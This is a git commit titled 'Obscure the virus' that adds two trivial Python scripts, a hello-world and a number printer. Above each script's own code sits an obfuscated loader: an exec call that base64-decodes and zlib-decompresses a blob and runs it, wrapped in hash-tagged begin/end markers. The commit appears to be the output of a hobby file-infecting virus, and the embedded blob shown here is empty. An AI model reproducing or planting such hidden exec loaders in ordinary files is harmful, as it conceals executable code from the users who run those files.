32f749fa06be7f93c693ba0c55369b6c35bb0e39
Zyambo <mightypz2@gmailcom>
2023-01-19 22:28:54 +0200

    Obscure the virus

---
+++ test-files2/hello.py
@@ -0,0 +1,5 @@
+
+# begin-8d35108ffe2ad173a697734a3e9938e1
+exec("import zlib\nimport base64\nexec(zlib.decompress(base64.urlsafe_b64decode(b'eNoDAAAAAAE=')))")
+# end-8d35108ffe2ad173a697734a3e9938e1
+print("Hello Zambia")
---
+++ test-files2/print_nums.py
@@ -0,0 +1,6 @@
+
+# begin-6d1fd487ab1242abbb6d7911c914a2ff
+exec("import zlib\nimport base64\nexec(zlib.decompress(base64.urlsafe_b64decode(b'eNoDAAAAAAE=')))")
+# end-6d1fd487ab1242abbb6d7911c914a2ff
+for i in range(100):
+    print(i)
